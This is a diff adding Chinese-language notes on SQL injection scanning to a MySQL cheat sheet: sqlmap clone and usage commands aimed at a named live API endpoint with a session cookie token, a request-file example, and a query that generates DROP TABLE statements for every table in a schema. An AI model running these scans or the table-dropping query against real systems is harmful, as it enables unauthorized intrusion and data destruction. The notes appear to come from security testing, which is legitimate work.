@@ -237,3 +237,51 @@ show full processlist
 -- select id, db, user, host, command, time, state, info from information_schema.processlist order by time desc
 ```
 
+##### sql注入扫描
+
+##### 工具下载 
+
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+
+#####使用文档 
+
+#####https://www.jianshu.com/p/65d7522ecc1f
+
+https://sqlmap.kvko.live/usage
+
+```python
+python sqlmap.py  –dbms mysql --dbs --level 5 --cookie=token: c06db763-7c09-4b07-9164-179f77ebcd29 -u "https://open.isyscore.com/api/opencms/search?current=1&size=10&keyword=%271%27=%271%27&category=%E6%96%87%E7%AB%A0"
+```
+
+##### 删除所有表
+
+```sql
+select concat("DROP TABLE IF EXISTS ", table_name, ";") from information_schema.tables where table_schema="isc_function";
+```
+
+##### 案例
+
+```python
+# 假设http请求保存在如下文件中（http.txt):
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: no-cache
+Connection: keep-alive
+Cookie: BAIewD=E47869416FeqCBD231ED9C1ewqeF83C:FG=1; BIDUPSID=E47869416F8BE5026CBD231ED9C1F83C; PSTM=w1526868067; BDORZ=B490B5EBF6Fsaf3CD402E5eqDA1598; H_PS_PSSID=1437_21120_20928; PSINO=3
+Host: baidu.com
+Pragma: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+#则使用如【下命令让sqlmap解析该文件，以该文件中HTTP请求目标为攻击目标进行测试：
+#--batch使用默认配置
+python sqlmap.py -r opencms_search.txt --level=5 risk=3 --batch
+```
+
+```python
+#keyword=1
+python sqlmap.py -u https://open.isyscore.com/api/opencms/search\?current\=1\&size\=10\&keyword\=%27\&category\=%E6%96%87%E7%AB%A0
+-- 
+python sqlmap.py -u https://open.isyscore.com/api/opencms/search\?current\=1\&size\=10\&keyword\=%27\&category\=%E6%96%87%E7%AB%A0 --dbs
+```
+
